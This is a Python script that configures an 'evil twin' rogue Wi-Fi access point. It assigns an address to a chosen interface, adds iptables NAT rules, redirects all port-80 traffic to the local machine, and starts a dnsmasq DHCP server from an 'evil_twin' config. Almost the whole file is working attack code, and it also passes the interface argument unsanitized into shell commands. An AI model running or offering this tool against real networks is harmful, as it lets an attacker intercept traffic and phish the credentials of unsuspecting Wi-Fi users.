import subprocess
import optparse

parser = optparse.OptionParser()
# [+] [+] [+] Interface Argument [+] [+] [+]
parser.add_option('-i', '--interface', dest='interface', help='Enter interface -i [INTERFACE]  =)')

(options, arguments) = parser.parse_args()
interface = options.interface

if interface:
    # [@] Configure INTERFACE [@]
    subprocess.call(f'sudo ifconfig {interface} 10.0.0.1 netmask 255.255.255.0', shell=True)
    print(f'{interface} runnning on 10.0.0.1 netmask 255.255.255,0 [+]')
    # [+] [+] [+] Setup NAT [+] [+] [+]
    subprocess.call('sudo iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE', shell=True)
    subprocess.call(f'sudo iptables --append FORWARD --in-interface {interface} -j ACCEPT', shell=True)
    subprocess.call('sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80 ', shell=True)
    subprocess.call('sudo iptables -t nat -A POSTROUTING -j MASQUERADE', shell=True)
    print(f'iptables configured [+]')

    # Enable IP forwarding
    # subprocess.call('sudo echo bash "1 > /proc/sys/net/ipv4/ip_forward"', shell=True)

    # Start dhcpd Listener
    subprocess.call('sudo dnsmasq -C ~/Desktop/evil_twin/dnsmaq.conf -d', shell=True)
else:
    print('[@] Eter Interface [@]')

